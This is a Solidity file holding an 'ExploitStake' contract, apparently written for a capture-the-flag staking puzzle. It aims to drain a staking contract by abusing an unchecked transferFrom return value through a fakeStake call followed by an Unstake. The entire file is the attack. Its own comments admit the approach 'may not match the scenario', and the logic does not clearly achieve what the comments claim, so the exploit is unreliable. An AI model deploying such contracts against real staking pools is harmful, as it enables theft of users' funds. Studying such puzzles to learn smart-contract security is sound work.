pragma solidity ^0.8.0;

interface IStake {
    function WETH() external view returns (address);
    function StakeWETH(uint256 amount) external returns (bool);
    function Unstake(uint256 amount) external returns (bool);
    function UserStake(address stakeholder) external view returns (uint256);
}

contract ExploitStake {
    IStake public instance;
    address public weth;

    constructor(address _instance) {
        instance = IStake(_instance);
        weth = instance.WETH();
    }

    function fakeStake() external {
        uint256 amount = 0.002 ether;
        // Approve high allowance on the WETH contract pointing to attacker
        // This assumes weth is attacker's contract
        // But weth is fixed in instance.constructor
        // Therefore, this approach may not match the scenario.
        IWETH(weth).approve(address(instance), amount);
        // Call StakeWETH on instance with 0.002 ether
        instance.StakeWETH(amount);
        // Since transferFrom is called but return value not checked, the stake can be retrieved via Unstake
    }

    function drain() external {
        uint256 userStake = instance.UserStake(address(this));
        instance.Unstake(userStake);
    }
}

interface IWETH {
    function approve(address spender, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function transferFrom(address src, address dst, uint256 amount) external returns (bool);
}